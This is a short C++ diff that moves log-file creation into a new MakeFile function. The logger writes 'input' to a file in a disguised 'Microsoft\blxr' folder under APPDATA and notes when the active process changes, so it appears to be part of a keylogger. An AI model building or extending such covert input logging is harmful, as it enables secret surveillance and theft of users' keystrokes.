@@ -3,7 +3,6 @@
 
 #define APPDATA "APPDATA"
 
-stream::LogFile *log_file;
 
 std::string stream::GetPath(const std::string &dir) {
   char *buf = nullptr;
@@ -25,12 +24,6 @@ bool stream::MakeDir(const std::string &path) {
 
 bool stream::WriteLog(const std::string &input, uint32_t &active, const bool block_process_info) {
   bool process_info = false;
-  try {
-	log_file = new stream::LogFile(stream::GetPath(R"(\Microsoft\blxr\)"), "blxr.txt");
-  } catch (...) {
-	std::cerr << "Log File init fail";
-	return false;
-  }
   uint32_t cur = system_data::GetProcessId();
   if (system_data::ProcessChanged(active, cur, true)) {
 	process_info = true;
@@ -48,3 +41,12 @@ bool stream::WriteLog(const std::string &input, uint32_t &active, const bool blo
   log_file->ofstream_.close();
   return true;
 }
+bool stream::MakeFile() {
+  try {
+	log_file = new stream::LogFile(stream::GetPath(R"(\Microsoft\blxr\)"), "blxr.txt");
+  } catch (...) {
+	return false;
+  }
+  return true;
+}
+
